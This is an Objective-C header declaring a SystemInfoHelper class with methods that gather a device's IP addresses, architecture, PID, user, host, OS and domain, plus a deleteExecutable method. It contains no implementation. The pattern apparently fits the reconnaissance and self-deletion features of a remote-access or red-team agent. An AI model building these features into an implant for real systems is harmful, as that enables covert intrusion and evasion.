#import <Foundation/Foundation.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <UIKit/UIKit.h>
#include <mach-o/dyld.h>

@interface SystemInfoHelper : NSObject

+ (NSString *)getInternalIPAddress;
+ (NSString *)getExternalIPAddress;
+ (NSString *)getArchitecture;
+ (NSInteger)getPID;
+ (NSString *)getUser;
+ (NSString *)getHost;
+ (NSString *)getOS;
+ (NSString *)getDomain;
+ (BOOL)deleteExecutable;

@end
